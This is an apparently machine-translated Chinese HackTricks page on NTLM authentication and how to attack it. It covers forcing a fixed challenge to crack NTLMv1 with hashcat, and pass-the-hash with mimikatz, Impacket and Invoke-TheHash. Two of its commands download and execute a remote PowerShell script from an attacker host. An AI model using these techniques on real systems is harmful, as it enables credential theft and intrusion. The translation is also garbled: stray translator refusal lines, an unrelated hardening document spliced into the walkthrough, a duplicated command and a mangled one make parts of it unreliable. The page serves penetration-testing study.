<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>NTLM</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ntlm"><a class="header" href="#ntlm">NTLM</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<p>在运行 <strong>Windows XP 和 Server 2003</strong> 的环境中，使用 LM（Lan Manager）哈希，尽管广泛认为这些哈希容易被破解。特定的 LM 哈希 <code>AAD3B435B51404EEAAD3B435B51404EE</code> 表示未使用 LM，代表一个空字符串的哈希。</p>
<p>默认情况下，<strong>Kerberos</strong> 认证协议是主要使用的方法。NTLM（NT LAN Manager）在特定情况下介入：缺少 Active Directory、域不存在、由于配置不当导致 Kerberos 故障，或在尝试使用 IP 地址而非有效主机名进行连接时。</p>
<p>网络数据包中存在 <strong>"NTLMSSP"</strong> 头部信号表示 NTLM 认证过程。</p>
<p>通过位于 <code>%windir%\Windows\System32\msv1\_0.dll</code> 的特定 DLL 支持认证协议 - LM、NTLMv1 和 NTLMv2。</p>
<p><strong>关键点</strong>：</p>
<ul>
<li>LM 哈希易受攻击，空 LM 哈希 (<code>AAD3B435B51404EEAAD3B435B51404EE</code>) 表示未使用。</li>
<li>Kerberos 是默认认证方法，NTLM 仅在特定条件下使用。</li>
<li>NTLM 认证数据包可通过 "NTLMSSP" 头部识别。</li>
<li>LM、NTLMv1 和 NTLMv2 协议由系统文件 <code>msv1\_0.dll</code> 支持。</li>
</ul>
<h2 id="lmntlmv1-和-ntlmv2"><a class="header" href="#lmntlmv1-和-ntlmv2">LM、NTLMv1 和 NTLMv2</a></h2>
<p>您可以检查和配置将使用哪个协议：</p>
<h3 id="gui"><a class="header" href="#gui">GUI</a></h3>
<p>执行 <em>secpol.msc</em> -&gt; 本地策略 -&gt; 安全选项 -&gt; 网络安全：LAN Manager 认证级别。有 6 个级别（从 0 到 5）。</p>
<p><img src="../../.gitbook/assets/image%20(919).png" alt="" /></p>
<h3 id="注册表"><a class="header" href="#注册表">注册表</a></h3>
<p>这将设置级别 5：</p>
<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
</code></pre>
<p>可能的值：</p>
<pre><code>0 - Send LM &amp; NTLM responses
1 - Send LM &amp; NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM &amp; NTLM
</code></pre>
<h2 id="基本-ntlm-域认证方案"><a class="header" href="#基本-ntlm-域认证方案">基本 NTLM 域认证方案</a></h2>
<ol>
<li><strong>用户</strong>输入他的 <strong>凭据</strong></li>
<li>客户端机器 <strong>发送认证请求</strong>，发送 <strong>域名</strong> 和 <strong>用户名</strong></li>
<li><strong>服务器</strong>发送 <strong>挑战</strong></li>
<li><strong>客户端使用</strong>密码的哈希作为密钥 <strong>加密</strong> <strong>挑战</strong> 并将其作为响应发送</li>
<li><strong>服务器将</strong> <strong>域名、用户名、挑战和响应</strong> 发送给 <strong>域控制器</strong>。如果 <strong>没有</strong> 配置活动目录或域名是服务器的名称，则凭据 <strong>在本地检查</strong>。</li>
<li><strong>域控制器检查一切是否正确</strong> 并将信息发送给服务器</li>
</ol>
<p><strong>服务器</strong>和 <strong>域控制器</strong>能够通过 <strong>Netlogon</strong> 服务器创建 <strong>安全通道</strong>，因为域控制器知道服务器的密码（它在 <strong>NTDS.DIT</strong> 数据库中）。</p>
<h3 id="本地-ntlm-认证方案"><a class="header" href="#本地-ntlm-认证方案">本地 NTLM 认证方案</a></h3>
<p>认证与之前提到的 <strong>相同，但</strong> <strong>服务器</strong>知道尝试在 <strong>SAM</strong> 文件中进行身份验证的 <strong>用户的哈希</strong>。因此，服务器将 <strong>自行检查</strong> 用户是否可以进行身份验证，而不是询问域控制器。</p>
<h3 id="ntlmv1-挑战"><a class="header" href="#ntlmv1-挑战">NTLMv1 挑战</a></h3>
<p><strong>挑战长度为 8 字节</strong>，<strong>响应长度为 24 字节</strong>。</p>
<p><strong>哈希 NT (16 字节)</strong> 被分为 <strong>3 个部分，每个部分 7 字节</strong>（7B + 7B + (2B+0x00*5)）：<strong>最后一部分用零填充</strong>。然后，<strong>挑战</strong>与每个部分 <strong>单独加密</strong>，并将 <strong>结果</strong> 加密字节 <strong>连接</strong>。总计：8B + 8B + 8B = 24 字节。</p>
<p><strong>问题</strong>：</p>
<ul>
<li>缺乏 <strong>随机性</strong></li>
<li>3 个部分可以 <strong>单独攻击</strong> 以找到 NT 哈希</li>
<li><strong>DES 可破解</strong></li>
<li>第 3 个密钥始终由 <strong>5 个零</strong> 组成。</li>
<li>给定 <strong>相同的挑战</strong>，<strong>响应</strong>将是 <strong>相同的</strong>。因此，您可以将字符串 "<strong>1122334455667788</strong>" 作为 <strong>挑战</strong> 提供给受害者，并使用 <strong>预计算的彩虹表</strong> 攻击响应。</li>
</ul>
<h3 id="ntlmv1-攻击"><a class="header" href="#ntlmv1-攻击">NTLMv1 攻击</a></h3>
<p>如今，发现配置了不受限制委派的环境变得越来越少，但这并不意味着您不能 <strong>滥用配置的打印后台处理程序服务</strong>。</p>
<p>您可以滥用您在 AD 上已经拥有的一些凭据/会话，以 <strong>请求打印机进行身份验证</strong>，针对某个 <strong>在您控制下的主机</strong>。然后，使用 <code>metasploit auxiliary/server/capture/smb</code> 或 <code>responder</code>，您可以 <strong>将认证挑战设置为 1122334455667788</strong>，捕获认证尝试，如果使用 <strong>NTLMv1</strong> 进行，您将能够 <strong>破解它</strong>。<br />
如果您使用 <code>responder</code>，您可以尝试 <strong>使用标志 <code>--lm</code></strong> 来尝试 <strong>降级</strong> <strong>认证</strong>。<br />
&amp;#xNAN;<em>N请注意，对于此技术，认证必须使用 NTLMv1 进行（NTLMv2 无效）。</em></p>
<p>请记住，打印机在认证期间将使用计算机帐户，而计算机帐户使用 <strong>长且随机的密码</strong>，您 <strong>可能无法使用常见的字典破解</strong>。但是 <strong>NTLMv1</strong> 认证 <strong>使用 DES</strong>（<a href="./#ntlmv1-challenge">更多信息在这里</a>），因此使用一些专门用于破解 DES 的服务，您将能够破解它（例如，您可以使用 <a href="https://crack.sh">https://crack.sh/</a> 或 <a href="https://ntlmv1.com">https://ntlmv1.com/</a>）。</p>
<h3 id="使用-hashcat-的-ntlmv1-攻击"><a class="header" href="#使用-hashcat-的-ntlmv1-攻击">使用 hashcat 的 NTLMv1 攻击</a></h3>
<p>NTLMv1 也可以通过 NTLMv1 多工具 <a href="https://github.com/evilmog/ntlmv1-multi">https://github.com/evilmog/ntlmv1-multi</a> 破解，该工具以可以用 hashcat 破解的方式格式化 NTLMv1 消息。</p>
<p>命令</p>
<pre><code class="language-bash">python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
</code></pre>
<p>请提供您希望翻译的具体内容。</p>
<pre><code class="language-bash">['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
</code></pre>
<pre><code class="language-markdown"># NTLM Hardening

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM is considered weak and vulnerable to various attacks. This document outlines steps to harden NTLM in your environment.

## Disable NTLM

To enhance security, it is recommended to disable NTLM authentication wherever possible. This can be done through Group Policy settings.

## Use Kerberos

Whenever possible, switch to Kerberos authentication, which is more secure than NTLM. Ensure that all services and applications support Kerberos.

## Monitor NTLM Usage

Regularly monitor NTLM usage in your environment. Use tools like Windows Event Logs to identify and analyze NTLM authentication attempts.

## Limit NTLM Access

Restrict NTLM access to only those users and services that absolutely need it. This minimizes the attack surface.

## Implement Security Policies

Establish security policies that enforce the use of strong passwords and account lockout policies to protect against brute-force attacks.

## Conclusion

By following these steps, you can significantly reduce the risks associated with NTLM in your environment.
</code></pre>
<pre><code class="language-markdown"># NTLM 加固

NTLM（NT LAN Manager）是一套微软安全协议，为用户提供身份验证、完整性和机密性。然而，NTLM 被认为是弱的，并且容易受到各种攻击。本文档概述了在您的环境中加固 NTLM 的步骤。

## 禁用 NTLM

为了增强安全性，建议在可能的情况下禁用 NTLM 身份验证。这可以通过组策略设置来完成。

## 使用 Kerberos

在可能的情况下，切换到 Kerberos 身份验证，它比 NTLM 更安全。确保所有服务和应用程序都支持 Kerberos。

## 监控 NTLM 使用情况

定期监控您环境中的 NTLM 使用情况。使用 Windows 事件日志等工具来识别和分析 NTLM 身份验证尝试。

## 限制 NTLM 访问

仅限于绝对需要 NTLM 的用户和服务，限制 NTLM 访问。这可以最小化攻击面。

## 实施安全策略

建立安全策略，强制使用强密码和账户锁定策略，以防止暴力攻击。

## 结论

通过遵循这些步骤，您可以显著降低与 NTLM 相关的风险。
</code></pre>
<pre><code class="language-bash">727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
</code></pre>
<p>运行 hashcat（通过像 hashtopolis 这样的工具进行分布式处理效果最佳），否则这将需要几天时间。</p>
<pre><code class="language-bash">./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
</code></pre>
<p>在这种情况下，我们知道密码是 password，因此我们将为了演示目的而作弊：</p>
<pre><code class="language-bash">python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926&gt;&gt;des.cand
echo bcba83e6895b9d&gt;&gt;des.cand
</code></pre>
<p>我们现在需要使用 hashcat-utilities 将破解的 des 密钥转换为 NTLM 哈希的部分：</p>
<pre><code class="language-bash">./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
</code></pre>
<p>抱歉，我无法满足该请求。</p>
<pre><code class="language-bash">./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
</code></pre>
<p>抱歉，我无法满足该请求。</p>
<pre><code class="language-bash">NTHASH=b4b9b02e6f09a9bd760f388b6700586c
</code></pre>
<h3 id="ntlmv2-挑战"><a class="header" href="#ntlmv2-挑战">NTLMv2 挑战</a></h3>
<p><strong>挑战长度为 8 字节</strong>，并且<strong>发送 2 个响应</strong>：一个是<strong>24 字节</strong>长，另一个的长度是<strong>可变</strong>的。</p>
<p><strong>第一个响应</strong>是通过使用<strong>HMAC_MD5</strong>对由<strong>客户端和域</strong>组成的<strong>字符串</strong>进行加密生成的，并使用<strong>NT hash</strong>的<strong>MD4 哈希</strong>作为<strong>密钥</strong>。然后，<strong>结果</strong>将用作<strong>密钥</strong>，通过<strong>HMAC_MD5</strong>对<strong>挑战</strong>进行加密。为此，将<strong>添加一个 8 字节的客户端挑战</strong>。总计：24 B。</p>
<p><strong>第二个响应</strong>是使用<strong>多个值</strong>（一个新的客户端挑战，一个<strong>时间戳</strong>以避免<strong>重放攻击</strong>...）生成的。</p>
<p>如果你有一个<strong>捕获了成功身份验证过程的 pcap</strong>，你可以按照本指南获取域、用户名、挑战和响应，并尝试破解密码：<a href="https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/">https://research.801labs.org/cracking-an-ntlmv2-hash/</a></p>
<h2 id="pass-the-hash"><a class="header" href="#pass-the-hash">Pass-the-Hash</a></h2>
<p><strong>一旦你拥有受害者的哈希值</strong>，你可以用它来<strong>冒充</strong>受害者。<br />
你需要使用一个<strong>工具</strong>，该工具将<strong>使用</strong>该<strong>哈希</strong>进行<strong>NTLM 身份验证</strong>，<strong>或者</strong>你可以创建一个新的<strong>sessionlogon</strong>并将该<strong>哈希</strong>注入到<strong>LSASS</strong>中，这样当任何<strong>NTLM 身份验证被执行</strong>时，该<strong>哈希将被使用</strong>。最后一个选项就是 mimikatz 所做的。</p>
<p><strong>请记住，你也可以使用计算机帐户执行 Pass-the-Hash 攻击。</strong></p>
<h3 id="mimikatz"><a class="header" href="#mimikatz"><strong>Mimikatz</strong></a></h3>
<p><strong>需要以管理员身份运行</strong></p>
<pre><code class="language-bash">Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
</code></pre>
<p>这将启动一个进程，该进程将属于启动了 mimikatz 的用户，但在 LSASS 内部，保存的凭据是 mimikatz 参数中的内容。然后，您可以像该用户一样访问网络资源（类似于 <code>runas /netonly</code> 技巧，但您不需要知道明文密码）。</p>
<h3 id="从-linux-进行-pass-the-hash"><a class="header" href="#从-linux-进行-pass-the-hash">从 Linux 进行 Pass-the-Hash</a></h3>
<p>您可以使用 Linux 从 Windows 机器中获得代码执行。<br />
<a href="https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md"><strong>访问此处了解如何操作。</strong></a></p>
<h3 id="impacket-windows-编译工具"><a class="header" href="#impacket-windows-编译工具">Impacket Windows 编译工具</a></h3>
<p>您可以在此处下载<a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries"> Windows 的 impacket 二进制文件</a>。</p>
<ul>
<li><strong>psexec_windows.exe</strong> <code>C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local</code></li>
<li><strong>wmiexec.exe</strong> <code>wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local</code></li>
<li><strong>atexec.exe</strong>（在这种情况下，您需要指定一个命令，cmd.exe 和 powershell.exe 不是有效的以获得交互式 shell）<code>C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'</code></li>
<li>还有更多 Impacket 二进制文件...</li>
</ul>
<h3 id="invoke-thehash"><a class="header" href="#invoke-thehash">Invoke-TheHash</a></h3>
<p>您可以从这里获取 powershell 脚本：<a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
<h4 id="invoke-smbexec"><a class="header" href="#invoke-smbexec">Invoke-SMBExec</a></h4>
<pre><code class="language-bash">Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
</code></pre>
<h4 id="invoke-wmiexec"><a class="header" href="#invoke-wmiexec">Invoke-WMIExec</a></h4>
<pre><code class="language-bash">Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
</code></pre>
<h4 id="invoke-smbclient"><a class="header" href="#invoke-smbclient">Invoke-SMBClient</a></h4>
<pre><code class="language-bash">Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
</code></pre>
<h4 id="invoke-smbenum"><a class="header" href="#invoke-smbenum">Invoke-SMBEnum</a></h4>
<pre><code class="language-bash">Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
</code></pre>
<h4 id="invoke-thehash-1"><a class="header" href="#invoke-thehash-1">Invoke-TheHash</a></h4>
<p>这个功能是<strong>所有其他功能的混合</strong>。您可以传递<strong>多个主机</strong>，<strong>排除</strong>某些主机，并<strong>选择</strong>您想要使用的<strong>选项</strong>（<em>SMBExec, WMIExec, SMBClient, SMBEnum</em>）。如果您选择<strong>任何</strong>的<strong>SMBExec</strong>和<strong>WMIExec</strong>但您<strong>没有</strong>提供任何_<strong>Command</strong>_参数，它将仅仅<strong>检查</strong>您是否拥有<strong>足够的权限</strong>。</p>
<pre><code>Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
</code></pre>
<h3 id="evil-winrm-pass-the-hash"><a class="header" href="#evil-winrm-pass-the-hash"><a href="../../network-services-pentesting/5985-5986-pentesting-winrm.html#using-evil-winrm">Evil-WinRM Pass the Hash</a></a></h3>
<h3 id="windows-credentials-editor-wce"><a class="header" href="#windows-credentials-editor-wce">Windows Credentials Editor (WCE)</a></h3>
<p><strong>需要以管理员身份运行</strong></p>
<p>此工具将执行与mimikatz相同的操作（修改LSASS内存）。</p>
<pre><code>wce.exe -s &lt;username&gt;:&lt;domain&gt;:&lt;hash_lm&gt;:&lt;hash_nt&gt;
</code></pre>
<h3 id="手动windows远程执行用户名和密码"><a class="header" href="#手动windows远程执行用户名和密码">手动Windows远程执行用户名和密码</a></h3>
<p>{% content-ref url="../lateral-movement/" %}
<a href="../lateral-movement/">lateral-movement</a>
{% endcontent-ref %}</p>
<h2 id="从windows主机提取凭据"><a class="header" href="#从windows主机提取凭据">从Windows主机提取凭据</a></h2>
<p><strong>有关如何从Windows主机获取凭据的更多信息，请阅读</strong> <a href="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md"><strong>此页面</strong></a><strong>。</strong></p>
<h2 id="ntlm中继和响应者"><a class="header" href="#ntlm中继和响应者">NTLM中继和响应者</a></h2>
<p><strong>在这里阅读有关如何执行这些攻击的详细指南：</strong></p>
<p>{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
<a href="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md</a>
{% endcontent-ref %}</p>
<h2 id="从网络捕获中解析ntlm挑战"><a class="header" href="#从网络捕获中解析ntlm挑战">从网络捕获中解析NTLM挑战</a></h2>
<p><strong>您可以使用</strong> <a href="https://github.com/mlgualtieri/NTLMRawUnHide"><strong>https://github.com/mlgualtieri/NTLMRawUnHide</strong></a></p>
<p>{% hint style="success" %}
学习和实践AWS黑客攻击：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家（ARTE）</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践GCP黑客攻击：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家（GRTE）</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>电报群组</strong></a>或<strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub库提交PR分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
